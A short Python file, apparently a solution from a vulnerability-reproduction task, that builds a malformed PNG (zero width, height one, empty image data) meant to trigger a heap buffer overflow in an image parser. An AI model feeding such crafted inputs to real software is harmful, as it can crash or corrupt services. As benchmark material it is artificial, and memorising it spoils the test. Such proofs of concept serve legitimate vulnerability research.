import os
import struct
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG image with zero width and non-zero height
        # This should trigger heap buffer overflow when processing
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - zero width (0), height=1
        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0)
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', self._crc32(ihdr_chunk))
        ihdr_chunk = struct.pack('>I', 13) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk - minimal image data for RGB
        # For width=0, there's no actual pixel data, but we need a valid zlib stream
        import zlib
        # Create compressed data with zlib header and checksum
        # Empty compressed data since width=0
        compressed_data = zlib.compress(b'', level=9)
        idat_chunk = b'IDAT' + compressed_data
        idat_crc = struct.pack('>I', self._crc32(idat_chunk))
        idat_chunk = struct.pack('>I', len(compressed_data)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', self._crc32(iend_chunk))
        iend_chunk = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all chunks
        poc = png_signature + ihdr_chunk + idat_chunk + iend_chunk
        
        return poc
    
    def _crc32(self, data: bytes) -> int:
        import zlib
        return zlib.crc32(data) & 0xffffffff